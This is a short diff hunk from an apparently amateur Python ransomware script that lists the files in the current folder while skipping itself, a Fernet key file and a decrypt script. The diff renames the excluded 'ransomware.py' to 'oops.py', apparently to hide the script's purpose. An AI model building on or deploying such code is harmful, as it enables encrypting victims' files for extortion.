@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 files = []                              #create our list
 
 for file in os.listdir():               #list file in .
-    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
+    if file == "oops.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
         continue
     if os.path.isfile(file):            #onlu files
         files.append(file)              # append them to the list
